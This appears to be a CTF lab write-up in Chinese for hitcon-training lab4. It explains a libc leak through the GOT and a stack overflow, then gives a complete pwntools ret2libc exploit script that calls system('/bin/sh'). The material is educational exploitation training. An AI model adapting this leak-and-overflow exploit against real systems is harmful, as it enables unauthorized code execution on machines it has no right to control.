# week1
## hitcon-training -- lab4(ret2lib)
没开保护

<img width="671" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fcc194f1-bd6f-4239-a817-cd4c2333c96c">

有个任意地址泄漏

<img width="470" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/735ed291-3416-4df4-97f9-5461758fd114">

可以通过got表地址泄漏libc

<img width="496" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/e4a4b58a-22ab-4b9f-824b-79841f867ce4">

接下来的函数Print_message存在栈溢出 直接利用泄漏的libc打system

<img width="374" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/90f6f979-325c-4da5-81bf-bc73dd5f8747">

### exp_ret2lib.py

```python
from pwn import *
p = process("./ret2lib")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

printf_got = '0x804a010'
printf_got_10 = int(printf_got, 16)

ru('(in dec) :')
sl(str(printf_got_10))


ru('address : ')
libc_printf = int(ru('\n').strip(),16)
log.info("libc_printf ==> {}".format(hex(libc_printf)))

off_printf = 0x502b0
off_binsh = 0x18e363
off_system = 0x41780
libc_base = libc_printf - off_printf
log.info("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + off_system
libc_binsh = libc_base + off_binsh

off = 60

payload = b'a' * off 
payload+= p32(libc_system)
payload+= p32(0xdeadbeef)
payload+= p32(libc_binsh)

# raw_input("Ther")
ru('me :')
sl(payload)

shell()

```
